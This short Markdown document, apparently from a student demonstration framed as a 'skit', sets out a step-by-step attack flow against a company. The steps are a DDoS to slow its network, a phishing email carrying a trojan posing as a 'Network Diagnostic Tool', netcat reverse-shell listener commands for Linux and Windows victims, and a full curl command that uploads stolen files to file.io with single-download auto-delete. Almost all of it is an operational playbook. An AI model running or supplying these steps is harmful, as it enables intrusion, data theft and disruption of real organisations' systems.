# Attack Flow

1. DDoS to a company’s computer to cause slow network traffic

2. Send a phishing email with the ‘Network Diagnostic Tool’ to offer a solution to the slow traffics

3. Gain access to the computer and navigate through the computer’s directories
    - On attacker's computer (Linux with netcat installed), run the following
    ```bash
    sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```
    - If the victim is using Windows, run the following
    ```bash
    stty raw -echo; (stty size; cat) | nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```
    - Victim runs the 'Diagnostic Tool' executable file: [Linux](../Attack/victim_linux.py) or [Windows](../Attack/victim_windows.py)
    - Boom! Access granted!

4. Upload whatever files we want to file.io
    - Run the following curl script and take note of the key it returns
    ```bash
    curl -X 'POST' \
        'https://file.io/' \
        -H 'accept: application/json' \
        -H 'Content-Type: multipart/form-data' \
        -F 'file=@FILE_NAME_GOES_HERE' \
        -F 'expires=DATETIME_IN_ISO8601_FORMAT' \
        -F 'maxDownloads=1' \
        -F 'autoDelete=true'
    ```
    - Download all the files after the attack

5. Find another company as our target to attack

6. Perform the same attack again, turns out this company has very good security in place

7. End of our skit
